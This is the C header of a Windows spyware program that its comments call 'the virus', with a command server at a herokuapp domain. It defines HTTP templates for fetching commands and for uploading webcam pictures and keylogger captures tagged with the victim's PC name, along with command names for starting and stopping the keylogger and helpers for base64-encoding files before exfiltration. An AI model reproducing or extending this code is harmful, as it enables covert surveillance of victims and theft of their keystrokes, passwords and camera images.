// for socket.
#define WIN32_LEAN_AND_MEAN

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define _CRT_SECURE_NO_WARNINGS

#pragma once
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>


#include <ws2tcpip.h>

// if running localy:
/*#define SOCKET_IP "127.0.0.1"
#define SOCKET_PORT 8000
*/


// global variables for the socket connection has made with the heroku server. -> only if running on to server
//extern char SOCKET_IP[16];
//extern int SOCKET_PORT;

// if running locally
#define SOCKET_IP "127.0.0.1"
#define SOCKET_PORT 8000

#define DOMAIN_NAME "my-server-virus-commander.herokuapp.com"

#define HTTP_PORT "80"

#define SIZE_OF_HTTP_MSG 500

#define ONE_MIN_IN_MILISEC 60000 // one minute in milisecond

#define APOSTROPHES 34 // -> " in it's decimal ascii format

#define SIZE_OF_COMMAND 20
#define END_OF_HEADERS "\r\n\r\n"
#define FIRST_CONNECTION_MSG "POST /first_connection HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json"
#define GET_COMMAND_MSG "GET /command/%s HTTP/1.1\r\nAccept: application/json\r\nHost: %s:%d\r\n\r\n"
//						     pc_name^^^^^                                      socket_ip^  ^socket_port

#define POST_PICTURE_MSG "POST /%s/picture HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n{%cpicture_content%c:%c"/*%s%c}  ->  added in the function*/
//						pc_name^											                	                          data_length^  socket_ip^  ^socket_port                   ^picture_data


#define POST_Key_Logger_MSG "POST /%s/key_logger HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n{%ckey_logger%c:%c%s%c}"
//						    pc_name^						  				                									 data_length^  socket_ip^  ^socket_port                ^key_logger_data



// commands that the virus can do
#define WEB_CAM "WebCam"
#define START_KEY_LOGGER "StartKeyLogger"
#define STOP_KEY_LOGGER "StopKeyLogger"

// temp command
/*"WebCam",
"StartKeyLogger",
"StopKeyLogger"*/


extern char pc_name[MAX_COMPUTERNAME_LENGTH + 1]; // global variable of the pc-name -> used in many functions.


// Global variable for the thread handle.
extern HANDLE thread_handle; // thread handle for the Key Logger -> declared here to be able to close the thread when needed.


// defines for taking picture.
#define WIDTH 1400
#define HEIGHT 1000
#define PIXEL_SIZE 4



// defines for socket.
#ifndef UNICODE
#define UNICODE
#endif

#pragma comment(lib, "ws2_32.lib")


// returns the six bits of a number -> 63 -> 0b111111, 6 bits of 1's.
#define GET_SIX_BITS(num) num & 63 


// used for the key logger special keys table
struct SPECIAL_KEY
{
	int ascii;
	char key_name[9];
};


// used for the socket -> the missions / tasks for the virus
/*struct MISSIONS
{
	char command[SIZE_OF_COMMAND];
};*/

struct BASE_64
{
	char char_val;
	int decimal_val;
};


// This function return the amount of missions / tasks given in the data to the virus.
int amount_of_missions(char* data);

// This function parses a http message and returning the data given in it if no error occurred.
char* get_data_from_http_msg(char* server_response, int server_response_len);

// This function copies data from one ptr to other.
int copy_data(char* destination, char* source, int destination_size);

// This function encodes file to base 64 file.
int encode_to_base_64(char* file_to_encode, int file_size, char* file_destination, int file_destination_size);